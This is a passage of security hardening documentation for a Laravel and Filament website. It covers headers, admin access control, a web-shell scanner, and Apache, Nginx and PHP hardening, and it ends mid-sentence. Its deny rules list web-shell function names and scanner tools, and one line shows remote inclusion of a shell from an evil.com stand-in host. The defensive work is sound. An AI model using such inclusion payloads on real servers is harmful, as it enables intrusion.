# Security Considerations

> **IMPORTANT: Security Hardening Not Yet Applied to This Branch**
>
> This document describes the security architecture implemented on the `master` branch.
> The `design-v2` branch does **not** include the following security features:
> - SecurityHeaders middleware (CSP, HSTS, X-Frame-Options, etc.)
> - ThrottleAdminLogin middleware (brute-force protection)
> - SecurityAudit command (file integrity scanning)
> - ADMIN_EMAILS access control on the admin panel
> - Hardened .htaccess, nginx-security.conf, php-hardening.ini
> - Hardened deploy.sh script
> - Session hardening (encryption, secure cookies, SameSite=strict)
> - HTTPS enforcement in AppServiceProvider
>
> **Before deploying design-v2 to production, you MUST merge the security hardening from master.**
> See [10-BRANCH-COMPARISON.md](10-BRANCH-COMPARISON.md) for merge instructions.

This document is the definitive security reference for the HILOTEC website. It covers every security layer in the application, from HTTP headers to server hardening, and provides actionable guidance for maintaining a secure deployment.

**Audience:** IT infrastructure professionals who understand firewalls, access control, and patching, but need the web-application-specific context for a Laravel + Filament stack.

**Key files referenced in this document:**

| File | Purpose |
|------|---------|
| `app/Http/Middleware/SecurityHeaders.php` | HTTP security headers |
| `app/Http/Middleware/ThrottleAdminLogin.php` | Admin login rate limiting |
| `app/Console/Commands/SecurityAudit.php` | File integrity scanner |
| `app/Models/User.php` | Admin access control (FilamentUser) |
| `app/Providers/Filament/AdminPanelProvider.php` | Admin panel middleware stack |
| `public/.htaccess` | Apache hardening rules |
| `nginx-security.conf` | Nginx hardening rules |
| `php-hardening.ini` | PHP runtime hardening |
| `deploy.sh` | Hardened deployment script |
| `config/session.php` | Session security configuration |
| `bootstrap/app.php` | Global middleware registration |

---

## Table of Contents

1. [Security Architecture Overview](#1-security-architecture-overview)
2. [SecurityHeaders Middleware](#2-securityheaders-middleware)
3. [Admin Panel Security](#3-admin-panel-security)
4. [SecurityAudit Command](#4-securityaudit-command)
5. [.htaccess Hardening](#5-htaccess-hardening)
6. [Nginx Security Config](#6-nginx-security-config)
7. [PHP Hardening](#7-php-hardening)
8. [Session Security](#8-session-security)
9. [CSRF Protection](#9-csrf-protection)
10. [Deploy Script Security](#10-deploy-script-security)
11. [GDPR Considerations](#11-gdpr-considerations)
12. [Common Attack Vectors and Mitigations](#12-common-attack-vectors-and-mitigations)
13. [Security Monitoring](#13-security-monitoring)
14. [Security Update Procedures](#14-security-update-procedures)
15. [Incident Response Checklist](#15-incident-response-checklist)

---

## 1. Security Architecture Overview

The application implements defense-in-depth with multiple independent security layers. If any single layer is bypassed, the remaining layers continue to provide protection.

```
                          INCOMING REQUEST
                                |
                                v
                    +-------------------------+
                    |    DNS / CDN Layer       |
                    |  (CAA records, DNSSEC)   |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    TLS Termination       |
                    |  (HTTPS only, HSTS)      |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    Web Server Layer      |
                    |  (.htaccess or Nginx)    |
                    |  - Block hidden files    |
                    |  - Block PHP in assets   |
                    |  - Block scanners        |
                    |  - Block dangerous exts  |
                    |  - Rate limiting         |
                    |  - Request size limits   |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    PHP Runtime Layer     |
                    |  (php-hardening.ini)     |
                    |  - Disabled functions    |
                    |  - open_basedir          |
                    |  - Secure sessions       |
                    |  - Error suppression     |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    Laravel Middleware    |
                    |  - SecurityHeaders      |
                    |  - CSRF verification    |
                    |  - Session encryption   |
                    |  - ThrottleRequests     |
                    |  - ThrottleAdminLogin   |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    Application Layer     |
                    |  - Input validation     |
                    |  - Eloquent ORM (bound  |
                    |    parameters)           |
                    |  - Blade escaping       |
                    |  - FilamentUser ACL     |
                    |  - bcrypt passwords     |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    Data Layer            |
                    |  - Encrypted sessions   |
                    |  - File permissions     |
                    |  - DB outside web root  |
                    +-------------------------+
                                |
                                v
                    +-------------------------+
                    |    Monitoring Layer      |
                    |  - SecurityAudit (6h)   |
                    |  - Email alerts         |
                    |  - Log analysis         |
                    +-------------------------+
```

**Principle:** No single layer is trusted to be sufficient. The web server blocks known-bad requests before they reach PHP. PHP restricts dangerous functions before they reach Laravel. Laravel validates, escapes, and encrypts before data reaches the database. The monitoring layer detects anything that slips through.

---

## 2. SecurityHeaders Middleware

> *This feature is only available on the `master` branch. See the warning at the top of this document.*

**File:** `app/Http/Middleware/SecurityHeaders.php`
**Registration:** `bootstrap/app.php` -- appended to the global middleware stack, so it runs on every HTTP response.

```php
$middleware->append(\App\Http\Middleware\SecurityHeaders::class);
```

The middleware only adds headers to HTML responses (it checks `Content-Type: text/html`) to avoid interfering with API responses, file downloads, or asset serving.

### Headers Applied to All HTML Responses

#### X-Frame-Options: SAMEORIGIN

Prevents the site from being embedded in an `<iframe>` on another domain. This is the primary defense against clickjacking attacks, where an attacker overlays an invisible iframe of your site on top of a malicious page to trick users into clicking admin buttons.

`SAMEORIGIN` allows the site to frame itself (needed for some admin panel features) but blocks all external domains.

#### X-Content-Type-Options: nosniff

Tells browsers to respect the declared `Content-Type` header and not try to "guess" the type. Without this, a browser might interpret an uploaded `.txt` file as HTML and execute embedded JavaScript. This is a critical defense when any user-uploaded content is served.

#### X-XSS-Protection: 1; mode=block

A legacy header for older browsers (Internet Explorer, older Chrome) that do not support CSP. Modern browsers have deprecated their built-in XSS auditors in favor of CSP, but this header provides a fallback for clients that still support it. `mode=block` tells the browser to block the entire page rather than attempting to sanitize a detected XSS payload.

#### Referrer-Policy: strict-origin-when-cross-origin

Controls how much URL information is sent in the `Referer` header when navigating away from the site:

- **Same-origin requests:** Full URL is sent (needed for analytics and internal routing).
- **Cross-origin requests (HTTPS to HTTPS):** Only the origin (e.g., `https://hilotec.com`) is sent -- no path or query string.
- **HTTPS to HTTP downgrade:** No referrer sent at all.

This prevents leaking internal URL paths (which might contain slugs, IDs, or tokens) to third-party services.

#### Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Only applied in production or when the request is already over HTTPS. This header tells browsers:

- `max-age=31536000` -- For the next 365 days, always use HTTPS for this domain, even if the user types `http://`.
- `includeSubDomains` -- Apply to all subdomains as well.
- `preload` -- Allows submission to the HSTS preload list (hstspreload.org), which hardcodes HTTPS into browser source code. Once preloaded, even the very first visit is over HTTPS.

**Warning:** Once you submit to the preload list, removal takes months. Ensure all subdomains support HTTPS before enabling this.

#### Permissions-Policy

Explicitly disables browser APIs the site does not use:

```
camera=(), microphone=(), geolocation=(), payment=(), usb=(),
magnetometer=(), gyroscope=(), accelerometer=()
```

Each `()` means "no origin is allowed." This prevents any injected script from accessing the camera, microphone, GPS, payment APIs, or device sensors. It also signals to browser permission prompts that the site will never request these.

#### Cross-Origin-Opener-Policy: same-origin

Prevents other windows/tabs from obtaining a reference to this window via `window.opener`. This blocks a class of attacks where a malicious page opened from this site could manipulate the opener window (reverse tabnapping). Only same-origin pages can interact with each other.

#### Cross-Origin-Resource-Policy: same-origin

Prevents other origins from loading resources (images, scripts, stylesheets) from this site. This stops third-party sites from hotlinking assets or using the site's resources in attacks.

### Content Security Policy (Public Pages)

CSP is applied only to public pages. Admin pages and Livewire routes are excluded because Filament requires inline styles and scripts that would conflict with a strict CSP.

The CSP is defined in the `publicCsp()` method:

| Directive | Value | Purpose |
|-----------|-------|---------|
| `default-src` | `'self'` | Only allow resources from the same origin by default |
| `script-src` | `'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com https://www.google-analytics.com https://www.googletagmanager.com` | Allow scripts from self, inline scripts (needed for Alpine.js), and Google services |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` | Allow styles from self, inline styles (needed for Tailwind), and Google Fonts CSS |
| `img-src` | `'self' data: https:` | Allow images from self, data URIs (inline SVGs), and any HTTPS source |
| `font-src` | `'self' https://fonts.gstatic.com` | Allow fonts from self and Google Fonts CDN |
| `frame-src` | `'self' https://www.google.com` | Allow iframes from self and Google (reCAPTCHA challenge) |
| `connect-src` | `'self' https://www.google-analytics.com https://www.google.com` | Allow AJAX/fetch to self and Google analytics |
| `form-action` | `'self'` | Forms can only submit to the same origin -- prevents form hijacking |
| `base-uri` | `'self'` | Locks the `<base>` tag to prevent base URI injection attacks |
| `object-src` | `'none'` | No plugins (Flash, Java applets) allowed |
| `frame-ancestors` | `'self'` | Only this site can embed this page in a frame (CSP-level clickjacking protection) |
| `upgrade-insecure-requests` | (directive) | Automatically upgrades `http://` resource URLs to `https://` |

### Admin-Specific Headers

When the request path starts with `admin/`, two additional headers are set:

- **X-Robots-Tag: noindex, nofollow** -- Prevents search engines from indexing the admin panel. Even if the URL leaks, it will not appear in search results.
- **Cache-Control: no-store, no-cache, must-revalidate, private** -- Prevents browsers and proxies from caching admin pages. This ensures that logged-out users cannot use the back button to view cached admin content.

### How to Modify the CSP

To add a new third-party service (e.g., a chat widget, a new analytics provider):

1. Open `app/Http/Middleware/SecurityHeaders.php`.
2. Find the `publicCsp()` method.
3. Add the domain to the appropriate directive. For example, to add a chat widget:
   ```php
   "script-src 'self' 'unsafe-inline' https://www.google.com ... https://widget.example.com",
   "connect-src 'self' ... https://api.example.com",
   ```
4. Test by opening browser DevTools > Console. CSP violations appear as error messages with the blocked domain name.
5. Deploy and verify no console errors remain.

**Never add `'unsafe-eval'` to `script-src`** unless absolutely required by a third-party library. It enables `eval()` in JavaScript and significantly weakens XSS protection.

---

## 3. Admin Panel Security

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> On `design-v2`, any authenticated user can access the admin panel -- there is no `ADMIN_EMAILS` restriction, no `ThrottleAdminLogin` middleware, and no `ThrottleRequests` on the admin panel.

The Filament admin panel at `/admin` is protected by multiple independent layers.

### FilamentUser Interface

**File:** `app/Models/User.php`

The `User` model implements `FilamentUser`, which requires the `canAccessPanel()` method:

```php
public function canAccessPanel(Panel $panel): bool
{
    $adminEmails = array_map('trim', explode(',', env('ADMIN_EMAILS', '')));
    return in_array($this->email, $adminEmails);
}
```

**How it works:** Even if a user has valid login credentials, they cannot access the admin panel unless their email address is listed in the `ADMIN_EMAILS` environment variable. This is a whitelist approach -- no email in the list means zero admin access.

**Configuration:**

```env
ADMIN_EMAILS=admin@hilotec.com,other-admin@hilotec.com
```

Multiple addresses are comma-separated. The `array_map('trim', ...)` handles whitespace around commas.

**Security implication:** This means that even if an attacker compromises a user account through password reuse or a database leak, they still cannot access the admin panel unless the compromised email is in `ADMIN_EMAILS`. Changing admin access requires server-level `.env` access, not just database access.

### ThrottleAdminLogin Middleware

**File:** `app/Http/Middleware/ThrottleAdminLogin.php`

Limits login POST requests to the admin panel:

- **Limit:** 5 POST attempts per minute per IP address.
- **Key:** `admin-login:{ip}` in the Laravel rate limiter cache.
- **Decay:** 60 seconds -- the counter resets one minute after the first attempt.
- **Response:** HTTP 429 with a message indicating how many seconds to wait.

Only POST requests are throttled -- GET requests (loading the login page) are not affected.

**Important:** This middleware rate-limits by IP. If your server is behind a load balancer or CDN, ensure the `TrustProxies` middleware is configured so `$request->ip()` returns the real client IP, not the proxy IP.

### ThrottleRequests on the Admin Panel

**File:** `app/Providers/Filament/AdminPanelProvider.php`

The Filament admin panel middleware stack includes:

```php
ThrottleRequests::class . ':60,1',
```

This applies Laravel's built-in rate limiter to all admin panel requests: 60 requests per minute per IP. This protects against:

- Automated content scraping of admin pages.
- Rapid-fire API abuse through Livewire endpoints.
- Denial-of-service against the admin panel specifically.

### Full Admin Middleware Stack

The complete middleware stack for the admin panel, in order of execution:

1. **EncryptCookies** -- Encrypts all cookie values.
2. **AddQueuedCookiesToResponse** -- Attaches queued cookies.
3. **StartSession** -- Initializes the session (encrypted, database-backed).
4. **AuthenticateSession** -- Invalidates the session if the user's password has changed since the session started. This means that if an admin changes their password, all other active sessions for that account are immediately logged out.
5. **ShareErrorsFromSession** -- Shares validation errors.
6. **VerifyCsrfToken** -- CSRF protection (see Section 9).
7. **SubstituteBindings** -- Route model binding.
8. **DisableBladeIconComponents** -- Filament performance optimization.
9. **DispatchServingFilamentEvent** -- Filament event handling.
10. **ThrottleRequests:60,1** -- Rate limiting (60/min).

After all middleware passes, the **Authenticate** auth middleware runs as the auth guard.

### Password Reset

Password reset is enabled on the admin panel:

```php
$panel->passwordReset()
```

This provides a "Forgot password?" link on the login page that sends a reset email. The reset token is cryptographically random, time-limited, and single-use (standard Laravel behavior).

### Password Hashing

Passwords are hashed with bcrypt. The `.env.example` sets:

```env
BCRYPT_ROUNDS=12
```

The User model's `casts` array includes `'password' => 'hashed'`, which means Laravel automatically hashes any value assigned to the `password` attribute. The `password` and `remember_token` fields are in the `$hidden` array, preventing accidental exposure in JSON responses.

---

## 4. SecurityAudit Command

> *This feature is only available on the `master` branch. See the warning at the top of this document.*

**File:** `app/Console/Commands/SecurityAudit.php`
**Schedule:** Every 6 hours (`routes/console.php`)

```php
Schedule::command('security:audit --fix --notify')->everySixHours();
```

This is an artisan command that scans the `public/` directory for indicators of compromise. Web shells, backdoors, and phishing pages are commonly uploaded to `public/` subdirectories because those files are directly accessible via HTTP.

### Usage

```bash
# Scan only (report findings)
php artisan security:audit

# Scan and quarantine suspicious files
php artisan security:audit --fix

# Scan and send email alert
php artisan security:audit --notify

# Both (used in scheduled task)
php artisan security:audit --fix --notify
```

### What It Checks

#### 1. Unauthorized Root Files

Compares files in `public/` against a whitelist:

```php
$allowedPublicFiles = [
    '.htaccess', 'index.php', 'robots.txt', 'favicon.ico',
    'favicon.svg', 'favicon.png', 'apple-touch-icon.png', 'site.webmanifest',
];
```

Any file not in this list is flagged as `UNAUTHORIZED_FILE`. Attackers commonly drop web shells, phishing pages, or redirect scripts directly into the web root.

#### 2. Unauthorized Directories

Compares directories in `public/` against a whitelist:

```php
$allowedPublicDirs = [
    'build', 'css', 'js', 'storage', 'fonts', 'images', 'vendor',
];
```

Unexpected directories (e.g., `public/wp-admin/`, `public/.hidden/`) are flagged as `UNAUTHORIZED_DIR`.

#### 3. Dangerous Files in Asset Directories

Scans all files within allowed asset directories for dangerous extensions:

```
php, phtml, php3, php4, php5, php7, phps, cgi, pl, py, rb, sh, bash,
asp, aspx, jsp, exe, dll, com, bat, cmd, htaccess, htpasswd
```

It also checks for injected `.htaccess` files in subdirectories and scans non-PHP files (HTML, CSS, JS, SVG, ICO, TXT) for embedded PHP code (`<?php` or `<?=`). This catches attacks where PHP code is hidden inside an otherwise innocent file.

#### 4. .htaccess Integrity

Checks the main `public/.htaccess` for suspicious patterns:

- External redirect rules (redirecting to a different domain).
- `Header set Location` directives.
- `Redirect 301/302` directives.
- `php_value auto_prepend_file` / `auto_append_file` (injects PHP code into every request).
- `SetHandler application/x-httpd-php` (makes non-PHP files execute as PHP).
- `AddType application/x-httpd-php` (same effect via MIME type).

It also compares the file against the git-tracked version using git hash objects. If the file has been modified outside of a deployment, it flags `HTACCESS_MODIFIED`.

#### 5. Symlinks

Scans for unauthorized symbolic links. Only the standard Laravel storage link is allowed:

```
public/storage -> storage/app/public
```

Any other symlink could allow an attacker to expose files outside the web root (e.g., `.env`, database files).

#### 6. File Permissions

Checks that:
- The `public/` directory is not world-writable (permission bit `0002`).
- `index.php` is not group-writable (permission bit `0010`).

World-writable directories allow any user on the system to drop files, which is a common vector for shared hosting attacks.

#### 7. Recently Modified Files

Reports any files in `public/` modified within the last 24 hours, excluding the `public/build/` directory (which changes during deployments). This provides a quick visual check for unexpected file changes.

### Quarantine (--fix)

When `--fix` is specified, suspicious files are moved to `storage/quarantine/YYYY-MM-DD_HHmmss/`:

- `UNAUTHORIZED_FILE`, `DANGEROUS_FILE`, `PHP_IN_ASSET`, `INJECTED_HTACCESS` -- File is moved to quarantine.
- `UNAUTHORIZED_DIR` -- Entire directory is moved to quarantine.
- `UNAUTHORIZED_SYMLINK` -- Symlink is deleted.
- Other issue types (permissions, .htaccess modifications) -- Logged as "cannot auto-fix."

Quarantined files are preserved for forensic analysis rather than deleted.

### Email Alerts (--notify)

When `--notify` is specified and issues are found, an email is sent to the address configured in `MAIL_TO` (falls back to `MAIL_FROM_ADDRESS`). The email includes:

- Total issue count.
- Each finding with its type, description, and file path.
- Timestamp and server hostname.

Configure in `.env`:

```env
MAIL_TO=admin@hilotec.com
```

---

## 5. .htaccess Hardening

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> On `design-v2`, `public/.htaccess` is the standard Laravel default (URL rewriting only, no security hardening rules).

**File:** `public/.htaccess`

This file is the first line of defense for Apache-based deployments. It runs before any PHP code executes.

### Options -MultiViews -Indexes

Disables two Apache features:
- **MultiViews** -- Apache's content negotiation, which can expose files by guessing similar filenames.
- **Indexes** -- Directory listing. Without this, navigating to `/images/` would show all files in that directory.

### Force HTTPS Redirect

```apache
RewriteCond %{HTTPS} off
RewriteCond %{HTTP_HOST} !^localhost
RewriteCond %{HTTP_HOST} !^127\.0\.0\.1
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

All HTTP requests are permanently redirected (301) to HTTPS. Localhost and 127.0.0.1 are excluded so local development works without SSL certificates.

### Block Hidden Files

```apache
RewriteCond %{REQUEST_URI} (^|/)\.(?!well-known/) [NC]
RewriteRule ^ - [F,L]
```

Blocks access to any file or directory starting with a dot (`.env`, `.git/`, `.htpasswd`, etc.). The exception is `.well-known/`, which is needed for:
- SSL certificate validation (Let's Encrypt ACME challenges).
- `security.txt` (RFC 9116).
- Other standardized discovery mechanisms.

### Block PHP in Asset Directories

```apache
RewriteCond %{REQUEST_URI} ^/(css|js|images|build|storage|fonts|uploads|assets|media|vendor)/.*\.php$ [NC]
RewriteRule ^ - [F,L]
```

This is the primary defense against uploaded web shells. Even if an attacker manages to upload a `.php` file into `/images/` or `/uploads/`, Apache will return 403 Forbidden instead of executing it. The rule covers all standard asset directories.

### Block Dangerous Extensions in Asset Directories

```apache
RewriteCond %{REQUEST_URI} ^/(css|js|images|build|storage|fonts|uploads|assets|media|vendor)/.*\.(phtml|php3|...|cmd)$ [NC]
RewriteRule ^ - [F,L]
```

Extends PHP blocking to cover alternative PHP extensions and other server-side scripting languages. Attackers sometimes use `.phtml`, `.php5`, or `.cgi` to bypass rules that only block `.php`.

### Block Sensitive File Types

```apache
<FilesMatch "\.(sql|sqlite|sqlite3|bak|log|ini|conf|yml|yaml|xml|json|lock|env|htpasswd)$">
    Require all denied
</FilesMatch>
```

Blocks direct access to configuration and data files that should never be served to browsers. This prevents accidental exposure of database dumps, backup files, log files, and configuration.

The following files are explicitly re-allowed because they need to be publicly accessible:

```apache
<FilesMatch "(manifest\.json|site\.webmanifest|sitemap\.xml|robots\.txt)$">
    Require all granted
</FilesMatch>
```

### Block Exploit Patterns

```apache
RewriteCond %{REQUEST_URI} (eval\(|base64_decode|gzinflate|str_rot13|system\(|exec\(|passthru\(|shell_exec\() [NC,OR]
RewriteCond %{QUERY_STRING} (eval\(|base64_decode|...) [NC]
RewriteRule ^ - [F,L]
```

Blocks requests where the URL or query string contains PHP function names commonly used in web shell payloads. This stops the most basic shell execution attempts at the web server level, before PHP even parses the request.

### Block CMS Scanners

```apache
RewriteCond %{REQUEST_URI} (wp-admin|wp-login|wp-content|wp-includes|xmlrpc\.php|wlwmanifest\.xml) [NC,OR]
RewriteCond %{REQUEST_URI} (phpmyadmin|pma|adminer|myadmin|phpinfo) [NC,OR]
RewriteCond %{REQUEST_URI} \.(?:git|svn|hg|bzr)/ [NC]
RewriteRule ^ - [F,L]
```

Returns 403 for common automated scanner paths. Bots constantly probe for WordPress, phpMyAdmin, and version control directories. Blocking these reduces noise in access logs and prevents information disclosure if any of these paths accidentally exist.

### Standard Laravel Rules

The remaining rules are standard Laravel front-controller routing:
- Passes the `Authorization` header through to PHP (needed for API auth).
- Passes the `X-XSRF-Token` header through to PHP (needed for CSRF verification on AJAX).
- Removes trailing slashes with a 301 redirect.
- Routes all non-file, non-directory requests to `index.php`.

### Additional Hardening

```apache
Options -Indexes
ServerSignature Off
Header always set X-Content-Type-Options "nosniff"
```

- Disables directory listing (also set at the top, but repeated as a fallback outside `<IfModule>`).
- Hides the Apache version from error pages and the `Server` header.
- Sets `nosniff` at the Apache level as a backup for the Laravel middleware header.

---

## 6. Nginx Security Config

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> The file `nginx-security.conf` does not exist on the `design-v2` branch.

**File:** `nginx-security.conf`

For Nginx-based deployments, this file provides equivalent protection to the `.htaccess` rules. Include it in your Nginx server block:

```nginx
include /path/to/your/project/nginx-security.conf;
```

### Prerequisites

Add these rate limiting zones to `/etc/nginx/nginx.conf` inside the `http {}` block:

```nginx
limit_req_zone $binary_remote_addr zone=admin_login:10m rate=5r/m;
limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
```

### Block Hidden Files

```nginx
location ~ /\.(?!well-known) {
    deny all;
    access_log off;
    log_not_found off;
}
```

Same as the `.htaccess` rule: blocks all dot-files except `.well-known/`. Access logging is disabled for these requests to avoid log pollution from automated scanners.

### Block PHP in Asset Directories

```nginx
location ~* ^/(css|js|images|build|storage|fonts|uploads|assets|media|vendor)/.+\.php$ {
    deny all;
    access_log /var/log/nginx/blocked-php-execution.log;
}
```

Blocks PHP execution in asset directories. Unlike the `.htaccess` version, this logs blocked attempts to a dedicated log file, which is useful for detecting compromise attempts.

### Block Dangerous File Types

```nginx
location ~* \.(phtml|php3|php4|php5|php7|phps|cgi|pl|py|sh|bash|asp|aspx|jsp)$ {
    deny all;
    access_log /var/log/nginx/blocked-suspicious-files.log;
}
```

Blocks dangerous file extensions globally (not just in asset directories). Logged to a dedicated file for monitoring.

### Block Scanner Paths

```nginx
location ~* (wp-admin|wp-login|wp-content|wp-includes|xmlrpc\.php|phpmyadmin|adminer|myadmin) {
    deny all;
    access_log off;
    return 444;
}
```

Returns Nginx's special status code `444`, which closes the connection immediately without sending any response. This is more efficient than returning a 403 page and gives scanners less information.

### Block Sensitive Files

```nginx
location ~* \.(sql|sqlite|sqlite3|bak|log|ini|conf|yml|yaml|lock|env|htpasswd|htaccess)$ {
    deny all;
    access_log off;
}
```

Blocks direct access to configuration and data files. Specific files that need to be public are re-allowed:

```nginx
location = /build/manifest.json { allow all; }
location = /site.webmanifest { allow all; }
location = /robots.txt { allow all; }
```

### Block Laravel Internals

```nginx
location ~* (artisan|composer\.(json|lock)|package\.(json|lock)|webpack\.mix\.js) {
    deny all;
}
```

Prevents access to build tool configuration files that could reveal dependency versions, internal paths, or other information useful to attackers.

### Block Exploit Patterns in Query Strings

```nginx
if ($query_string ~* "(eval\(|base64_decode|gzinflate|str_rot13|system\(|exec\(|passthru\(|shell_exec\()") {
    return 403;
}
```

Same PHP function name blocking as the `.htaccess` version, applied to query strings.

### Block Vulnerability Scanners by User Agent

```nginx
if ($http_user_agent ~* (nikto|sqlmap|nmap|masscan|zgrab|gobuster|dirbuster|wpscan|nessus|acunetix|havij|w3af)) {
    return 444;
}
```

Blocks requests from well-known security scanning tools. This is not a strong defense (user agents are trivially spoofed), but it blocks the majority of automated drive-by scans.

### Rate Limiting (Commented -- Enable After Adding Zones)

```nginx
# location = /admin/login {
#     limit_req zone=admin_login burst=3 nodelay;
#     try_files $uri $uri/ /index.php?$query_string;
# }
# limit_conn conn_limit 20;
```

Uncomment these after adding the rate limiting zones to `nginx.conf`. The `burst=3` allows 3 requests to be processed immediately before rate limiting kicks in. The `nodelay` flag rejects excess requests immediately rather than queueing them.

### Security Headers (Backup)

```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
```

These duplicate the headers set by the Laravel `SecurityHeaders` middleware. They serve as a backup in case PHP-FPM crashes or a static file is served directly by Nginx without going through Laravel.

### Connection Limits

```nginx
server_tokens off;
client_max_body_size 25m;
client_body_timeout 10s;
client_header_timeout 10s;
send_timeout 10s;
```

- **server_tokens off** -- Hides Nginx version from the `Server` header and error pages.
- **client_max_body_size 25m** -- Limits upload size to 25 MB (matches `php-hardening.ini`).
- **client_body_timeout 10s** -- Closes connections where the client takes more than 10 seconds to send the request body.
- **client_header_timeout 10s** -- Closes connections where the client takes more than 10 seconds to send request headers.
- **send_timeout 10s** -- Closes connections where the client does not read the response within 10 seconds.

These timeouts are the primary defense against Slowloris attacks, where an attacker opens many connections and sends data very slowly to exhaust server resources.

---

## 7. PHP Hardening

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> The file `php-hardening.ini` does not exist on the `design-v2` branch.

**File:** `php-hardening.ini`

Deploy as `/etc/php/8.x/fpm/conf.d/99-security.ini` and restart PHP-FPM.

### Information Disclosure

```ini
expose_php = Off
display_errors = Off
display_startup_errors = Off
log_errors = On
error_reporting = E_ALL
html_errors = Off
zend.exception_ignore_args = On
```

- **expose_php = Off** -- Removes the `X-Powered-By: PHP/8.x` header. Attackers use this to target version-specific vulnerabilities.
- **display_errors = Off** -- Never show error messages to users. A stack trace can reveal file paths, database credentials, and application structure.
- **log_errors = On** with **error_reporting = E_ALL** -- All errors are logged to the PHP error log for debugging, but nothing is shown to the user.
- **html_errors = Off** -- Prevents clickable links in error messages that could expose internal paths.
- **zend.exception_ignore_args = On** -- Omits function arguments from stack traces in logs. Arguments might contain passwords, tokens, or personal data.

### Disabled Functions

```ini
disable_functions = exec,passthru,shell_exec,system,popen,curl_multi_exec,parse_ini_file,show_source
```

These functions allow PHP code to execute operating system commands or expose sensitive configuration. Disabling them prevents web shells from executing commands even if an attacker uploads PHP code.

**Caveats noted in the file:**
- `proc_open` is NOT disabled because Composer and some queue workers require it.
- `putenv` is NOT disabled because the `vlucas/phpdotenv` library requires it.

If you do not run Composer on the production server (recommended -- run it during CI/CD build), you can also disable `proc_open`.

### Filesystem Restrictions

```ini
; open_basedir = /home/forge/yoursite.com:/tmp:/var/lib/php/sessions
allow_url_include = Off
enable_dl = Off
```

- **open_basedir** (commented -- customize for your path) -- Restricts PHP's filesystem access to the listed directories. If a web shell is uploaded, it cannot read `/etc/passwd`, other sites' files, or system directories. This is one of the strongest PHP hardening options.
- **allow_url_include = Off** -- Prevents `include('http://evil.com/shell.php')`. Remote file inclusion is a critical vulnerability class.
- **enable_dl = Off** -- Prevents dynamically loading PHP extensions, which could be used to bypass `disable_functions`.

### Resource Limits

```ini
max_execution_time = 30
max_input_time = 60
memory_limit = 256M
post_max_size = 25M
upload_max_filesize = 25M
max_file_uploads = 5
max_input_vars = 5000
```

These prevent resource exhaustion attacks:
- **max_execution_time = 30** -- Kills scripts that run longer than 30 seconds (prevents infinite loops and DoS).
- **memory_limit = 256M** -- Prevents a single request from consuming all server memory.
- **post_max_size = 25M** and **upload_max_filesize = 25M** -- Limits upload size (must match Nginx's `client_max_body_size`).
- **max_file_uploads = 5** -- Limits the number of files per upload request.
- **max_input_vars = 5000** -- Limits the number of form fields per request (prevents hash collision DoS).

### PHP Session Security

```ini
session.use_strict_mode = 1
session.use_cookies = 1
session.use_only_cookies = 1
session.cookie_secure = 1
session.cookie_httponly = 1
session.cookie_samesite = Strict
session.use_trans_sid = 0
session.sid_length = 128
session.sid_bits_per_character = 6
```

- **use_strict_mode** -- Rejects session IDs that were not generated by the server. Prevents session fixation attacks.
- **use_only_cookies** -- Disables session IDs in URLs (`?PHPSESSID=...`), which can leak via referrer headers and browser history.
- **cookie_secure** -- Session cookies are only sent over HTTPS.
- **cookie_httponly** -- Session cookies cannot be read by JavaScript (`document.cookie`). Mitigates session theft via XSS.
- **cookie_samesite = Strict** -- Session cookies are never sent on cross-origin requests. Strongest CSRF protection at the cookie level.
- **use_trans_sid = 0** -- Prevents PHP from automatically appending session IDs to URLs and form actions.
- **sid_length = 128** with **sid_bits_per_character = 6** -- Generates 768-bit session IDs (128 characters x 6 bits each), making brute-force session guessing computationally infeasible.

### Other

```ini
report_memleaks = On
cgi.fix_pathinfo = 0
```

- **report_memleaks** -- Logs memory leaks to help detect exploitation attempts.
- **cgi.fix_pathinfo = 0** -- Prevents a critical Nginx misconfiguration exploit where `/images/evil.jpg/anything.php` would execute `evil.jpg` as PHP. Always set to 0 for Nginx deployments.

---

## 8. Session Security

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> On `design-v2`, `config/session.php` uses Laravel defaults: `encrypt` is `false`, `secure` is `null`, and `same_site` is `lax`.

**File:** `config/session.php`

Laravel's session configuration in this project has been hardened beyond the defaults.

### Session Driver: Database

```php
'driver' => env('SESSION_DRIVER', 'database'),
```

Sessions are stored in the database instead of the filesystem. This is more secure because:
- Session data cannot be read by other applications on the same server (as it could with file-based sessions on shared hosting).
- Sessions are automatically garbage-collected by the database.
- You can query active sessions for auditing.

### Session Encryption

```php
'encrypt' => env('SESSION_ENCRYPT', true),
```

Default: **true** (the Laravel default is `false`).

All session data is encrypted with AES-256-CBC using the `APP_KEY` before being stored. Even if an attacker gains read access to the database, they cannot read session contents without the encryption key.

### HTTPS-Only Cookies

```php
'secure' => env('SESSION_SECURE_COOKIE', true),
```

Default: **true** (the Laravel default is `false`).

The session cookie is only sent over HTTPS connections. If a user somehow accesses the site over HTTP (e.g., before the HTTPS redirect), the session cookie is not transmitted, preventing interception on insecure networks.

### HTTP-Only Cookies

```php
'http_only' => env('SESSION_HTTP_ONLY', true),
```

The session cookie cannot be accessed by JavaScript. This means that even if an attacker finds an XSS vulnerability, `document.cookie` will not reveal the session cookie.

### SameSite: Strict

```php
'same_site' => env('SESSION_SAME_SITE', 'strict'),
```

Default: **strict** (the Laravel default is `lax`).

The session cookie is never sent on any cross-origin request. This means:
